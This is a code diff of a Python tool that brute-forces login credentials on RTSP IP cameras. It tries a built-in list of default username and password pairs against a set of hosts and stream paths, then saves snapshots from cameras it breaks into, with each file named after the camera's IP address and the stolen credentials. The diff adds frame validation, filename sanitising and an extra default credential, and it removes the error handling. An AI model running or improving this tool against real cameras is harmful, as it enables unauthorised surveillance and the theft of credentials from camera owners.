@@ -1,7 +1,18 @@
 import socket
 from sys import argv, exit
 from time import sleep
+from numpy import ndarray
 from cv2 import VideoCapture, imwrite
+
+def remove_forbidden_symbols(strng):
+	forbidden_symbols = ['/','\\','*','?','"','<','>','|','+',' ','.','%','!','@']
+	if type(strng) == int:
+		return strng
+	else:
+		for s in forbidden_symbols:
+			if s in strng:
+				strng = strng.replace(s,'')
+		return strng
 
 def create_describe_packet(CRED,IP,PATH):
 	global DESCRIBEPACKET
@@ -29,19 +40,26 @@ def logging(url):
 def get_capture(url):
 	vcap = VideoCapture(url)
 	ret, frame = vcap.read()
-	ip = url.split('/')[2].split('@')[1]
-	usr = url.split('/')[2].split('@')[0].split(':')[0]
-	pwd = url.split('/')[2].split('@')[0].split(':')[1]
-	path = url.split('/')[3]
-	imwrite('pics/%s_%s_%s_%s.jpg' % (ip, usr, pwd, path), frame)
-	print(' ...[+] Snapshot was downloaded! ' + url)
+	if type(frame) != ndarray:
+		print(' ...[-] Fake trigger')
+		return False
+	else:
+		ip = url.split('/')[2].split('@')[1]
+		usr = url.split('/')[2].split('@')[0].split(':')[0]
+		pwd = url.split('/')[2].split('@')[0].split(':')[1]
+		path = url.split('/')[3]
+		path = remove_forbidden_symbols(path)
+		imwrite('pics/%s_%s_%s_%s.jpg' % (ip, usr, pwd, path), frame)
+		print(' ...[+] Snapshot was downloaded! ' + url)
+		return True
 
 if __name__ == '__main__':
-
+	
 	DESCRIBEPACKET = ""
 	TIMEOUT = 5
 	PORT = 554
-	CRED = '''user:user
+	CRED = '''1111:1111
+user:user
 admin:12345
 root:root
 admin:123456
@@ -75,34 +93,38 @@ admin:wbox123'''
 		state = False
 		print("[%s/%d] Working with %s" % (line+1, len(HOSTS), host))
 		for route in ROUTES:
-			try:
-				create_describe_packet('', host, route)
-				data = rtsp_connect(DESCRIBEPACKET, host, PORT)
-				if '404 Not Found' not in data and '\x15\x00\x00\x00\x02\x02' not in data and '400' not in data:
-					print(' ...[+] Starting bruteforce')
-					for (i,cred) in enumerate(CRED):
-						create_describe_packet(cred, host, route)
-						data = rtsp_connect(DESCRIBEPACKET, host, PORT)
-						if '401 Unauthorized' not in data:
-							url = "rtsp://%s@%s%s" % (cred, host, route)
-							print(' ...[+] Sucssesful! ' + url)
-							get_capture(url)
-							logging(url)
-							state = True
-							break
-						if i+1 == len(CRED):
-							url = 'rtsp://' + host + route
-							print(' ...[+] Bruteforce has failed')
-							logging(url)
-							state = True
-							break
-				if state: break
-			except KeyboardInterrupt:
-				print(" ...[-] Terminated by user...")
-				exit()
-			except socket.timeout:
-				print(" ...[-] Socket timeout")
-				break
-			except:
-				print(" ...[-] Connection error")
-				break
+			#check_url_rtsp(CRED,host,route)
+			#sleep(100)
+		#try:
+			create_describe_packet('', host, route)
+			data = rtsp_connect(DESCRIBEPACKET, host, PORT)
+			if '404 Not Found' not in data and '\x15\x00\x00\x00\x02\x02' not in data and '400' not in data and '403' not in data:
+				#print(data)
+				print(' ...[+] Starting bruteforce')
+				for (i,cred) in enumerate(CRED):
+					create_describe_packet(cred, host, route)
+					data = rtsp_connect(DESCRIBEPACKET, host, PORT)
+					if '401 Unauthorized' not in data:
+						url = "rtsp://%s@%s%s" % (cred, host, route)
+						print(' ...[+] Sucssesful! ' + url)
+						get_capture(url)
+						logging(url)
+						state = True
+						break
+					if i+1 == len(CRED):
+						url = 'rtsp://' + host + route
+						print(' ...[+] Bruteforce has failed')
+						logging(url)
+						state = True
+						break
+			if state: break
+		#except KeyboardInterrupt:
+		#	print(" ...[-] Terminated by user...")
+		#	exit()
+		#except socket.timeout:
+		#	print(" ...[-] Socket timeout")
+		#	break
+		#except:
+		#	print(" ...[-] Connection error")
+		#	break
+
